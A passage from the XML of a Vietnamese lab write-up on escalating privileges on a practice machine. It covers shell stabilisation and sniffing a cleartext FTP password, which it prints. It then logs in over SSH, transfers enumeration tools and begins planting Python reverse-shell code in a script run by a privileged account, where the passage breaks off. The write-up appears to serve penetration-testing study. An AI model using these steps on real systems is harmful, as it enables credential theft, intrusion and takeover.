        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="34D6A072" wp14:editId="217CAA60">
            <wp:extent cx="6153785" cy="2439035"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16243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97557" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2439035"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19485BDE" w14:textId="77777777" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A1D020D" w14:textId="53665E9C" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>4. Ổn định shell và kiểm tra quyền sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E48045" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chuyển shell thô thành phiên TTY dễ thao tác hơn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A199EDA" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EFC51E" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python -c 'import pty; pty.spawn("/bin/bash")'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006A0B62" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Module pty tạo một terminal giả và khởi chạy /bin/bash, giúp các lệnh tương tác hoạt động ổn định hơn trong reverse shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5910542D" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra các lệnh mà tài khoản hiện tại được phép chạy bằng sudo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627A2DB8" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0438D0DA" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B0E8FB" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh sudo -l liệt kê chính sách sudo của người dùng hiện tại. Kết quả được sử dụng để xác định khả năng chuyển tài khoản hoặc leo thang đặc quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089BBC89" w14:textId="77777777" w:rsidR="00317D2B" w:rsidRDefault="00317D2B">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3BDD64E6" wp14:editId="3774A2B2">
            <wp:extent cx="4724400" cy="1247775"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="100581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8093" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4724400" cy="1247775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54617E3B" w14:textId="18CCEC8E" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>5. Theo dõi lưu lượng nội bộ và truy cập tài khoản hades</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B34758D" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Quan sát lưu lượng trên giao diện loopback để phát hiện thông tin xác thực hoặc tác vụ nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668E6D13" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FB5D5B" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>tcpdump -nntttttAi lo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46390B4E" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tcpdump bắt toàn bộ lưu lượng trên giao diện lo, không phân giải tên và hiển thị thời gian chi tiết. Việc giám sát loopback có thể làm lộ dữ liệu được các tiến trình nội bộ truyền dưới dạng văn bản rõ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15737F5D" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả/nhận xét: </w:t>
      </w:r>
      <w:r>
        <w:t>Từ lưu lượng nội bộ, ghi nhận thông tin cần thiết để thử truy cập tài khoản hades theo đúng tiến trình của bài lab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FF11EC" w14:textId="77777777" w:rsidR="00022392" w:rsidRDefault="00317D2B">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38BC3907" wp14:editId="492C02D5">
            <wp:extent cx="6153785" cy="1350010"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:docPr id="99099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90493" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1350010"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F1FB6A" w14:textId="721D5523" w:rsidR="00022392" w:rsidRPr="00022392" w:rsidRDefault="00022392">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A5826F5" wp14:editId="0B138E1B">
            <wp:extent cx="6153785" cy="1704340"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="91490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08920" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1704340"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AEED964" wp14:editId="3169615E">
            <wp:extent cx="6153785" cy="1641475"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="136102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25624" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1641475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="714B8A5B" w14:textId="4F5E8959" w:rsidR="00022392" w:rsidRPr="00022392" w:rsidRDefault="00022392">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Qua việc giám sát lưu lượng trên giao diện loopback bằng tcpdump, phát hiện phiên đăng nhập FTP nội bộ truyền thông tin xác thực dưới dạng văn bản rõ. Kết quả thu được tài khoản </w:t>
      </w:r>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hade</w:t>
      </w:r>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s và mật khẩu </w:t>
      </w:r>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PTpZTfU4vxgzvRBE</w:t>
      </w:r>
      <w:r w:rsidRPr="00022392">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Phản hồi 230 User hades logged in xác nhận thông tin đăng nhập hợp lệ. Đây là điểm yếu do giao thức FTP không mã hóa dữ liệu xác thực.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471416BE" w14:textId="5173C951" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đăng nhập máy mục tiêu bằng tài khoản hades.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B95030" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2846211F" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ssh hades@192.168.56.120</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25717A61" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Sử dụng thông tin xác thực thu được trong quá trình theo dõi lưu lượng nội bộ để mở phiên SSH với quyền của người dùng hades.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A0ABCE" w14:textId="17F41EA9" w:rsidR="00C81D4F" w:rsidRDefault="00022392">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0B48FFC1" wp14:editId="09496292">
            <wp:extent cx="6153785" cy="2636520"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3478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25556" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2636520"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>6. Chuyển công cụ liệt kê và giám sát tiến trình</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5F2AC9" w14:textId="3954808C" w:rsidR="00933316" w:rsidRDefault="00933316">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r w:rsidRPr="00933316">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEBC371" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chuyển script LinEnum.sh từ Kali sang thư mục cá nhân của hades.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B5BC70" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510AEE3A" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>scp LinEnum.sh hades@192.168.56.120:/home/hades</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B62033C" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>SCP sao chép LinEnum.sh sang máy mục tiêu để hỗ trợ kiểm tra cấu hình hệ thống, quyền file, cron job và các dấu hiệu leo thang đặc quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D11B6D" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chuyển công cụ pspy32 sang máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5215FE70" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CEE05C" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>scp pspy32 hades@192.168.56.120:/home/hades</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8202D1" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>pspy cho phép quan sát tiến trình và cron job mà không yêu cầu quyền root. Bản pspy32 được sử dụng phù hợp với kiến trúc của máy mục tiêu trong tài liệu nguồn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A81824" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Theo dõi các tiến trình được thực thi định kỳ trên hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B2C2B1" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE3E12E" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>./pspy32</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07429C99" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>pspy32 hiển thị các tiến trình mới, lệnh cron và các script được tài khoản đặc quyền gọi. Kết quả giúp xác định file hoặc đường dẫn có thể bị người dùng hades chỉnh sửa nhưng lại được thực thi bởi tài khoản có quyền cao hơn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217E48DD" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả/nhận xét: </w:t>
      </w:r>
      <w:r>
        <w:t>Quan sát đầu ra pspy và ghi lại chính xác tiến trình định kỳ, đường dẫn script cùng tài khoản thực thi để làm cơ sở cho bước leo thang đặc quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AACF6C7" w14:textId="61795AD3" w:rsidR="00C81D4F" w:rsidRDefault="00933316">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="079E423F" wp14:editId="12ACCC43">
            <wp:extent cx="6153785" cy="2072640"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="173832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4722" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2072640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>7. Tạo script reverse shell phục vụ leo thang đặc quyền</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2883E98A" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tạo file python.py chứa mã kết nối ngược về máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A32447" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BF675C" w14:textId="77777777" w:rsidR="003D2EF6" w:rsidRDefault="003D2EF6">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D2EF6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>vi /opt/ftpclient/ftpclient.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2005B610" w14:textId="41DAFA41" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nội dung file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9691"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C81D4F" w14:paraId="56657E0D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9691" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="16264D05" w14:textId="2913EF88" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">import </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>socket,subprocess</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>,os</w:t>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:r>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">s = </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>socket.socket</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(socket.AF_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>INET,socket</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="19"/>
              </w:rPr>
